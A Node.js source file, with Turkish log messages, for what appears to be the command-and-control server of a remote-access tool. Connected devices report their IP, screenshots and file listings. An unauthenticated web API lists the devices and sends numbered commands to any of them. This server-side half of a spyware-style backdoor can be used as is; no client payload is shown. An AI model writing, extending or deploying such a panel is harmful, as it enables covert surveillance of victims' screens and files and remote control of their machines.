const express = require('express');
const ws = require('ws');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));

const HTTP_PORT = 3000;
const WS_PORT = 8080;
let clients = [];

const wss = new ws.Server({ port: WS_PORT }, () => {
    console.log(`[*] Gelişmiş Soket Sunucusu Aktif | Port: ${WS_PORT}`);
});

wss.on('connection', (socket, req) => {
    const clientId = "NODE_" + Math.random().toString(36).substring(2, 7).toUpperCase();
    const clientIp = req.socket.remoteAddress ? req.socket.remoteAddress.replace('::ffff:', '') : '127.0.0.1';
    
    const clientInfo = {
        id: clientId,
        ip: clientIp,
        status: "Çevrimiçi",
        lastSeen: Date.now(),
        files: [],
        currentScreen: ""
    };
    
    clients.push({ info: clientInfo, socket: socket });
    console.log(`[+] Cihaz Bağlandı: ${clientId} (${clientIp})`);

    socket.on('message', (message) => {
        try {
            const payload = JSON.parse(message);
            const target = clients.find(c => c.socket === socket);
            
            if (target) {
                target.info.lastSeen = Date.now();
                target.info.status = "Çevrimiçi";
                
                if (payload.type === "SCREENSHOT") {
                    target.info.currentScreen = payload.data;
                } else if (payload.type === "FILE_LIST") {
                    target.info.files = payload.data;
                } else {
                    target.info.lastResponse = payload.data || message.toString();
                }
            }
        } catch (e) {
            const target = clients.find(c => c.socket === socket);
            if (target) {
                target.info.lastSeen = Date.now();
                target.info.lastResponse = message.toString();
            }
        }
    });

    socket.on('close', () => {
        const target = clients.find(c => c.socket === socket);
        if (target) target.info.status = "Çevrimdışı";
    });
});

setInterval(() => {
    const now = Date.now();
    clients.forEach(c => {
        if (now - c.info.lastSeen > 15000 && c.info.status === "Çevrimiçi") {
            c.info.status = "Bağlantı Kesildi";
        }
    });
}, 5000);

// --- API ENDPOINTS ---
app.get('/api/clients', (req, res) => {
    res.json(clients.map(c => c.info));
});

app.post('/api/command', (req, res) => {
    const { clientId, commandId, extraData } = req.body;
    const target = clients.find(c => c.info.id === clientId);

    if (!target || target.info.status !== "Çevrimiçi") {
        return res.status(404).json({ error: "Cihaz aktif değil veya bulunamadı." });
    }

    target.socket.send(JSON.stringify({ commandId: parseInt(commandId), data: extraData || "" }));
    res.json({ success: true, message: "İşlem cihaza gönderildi." });
});

// Arayüzü direkt ana dizindeki index.html'den okuyoruz
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(HTTP_PORT, () => {
    console.log(`[+] Yönetim Paneli Yayında: http://localhost:${HTTP_PORT}`);
});
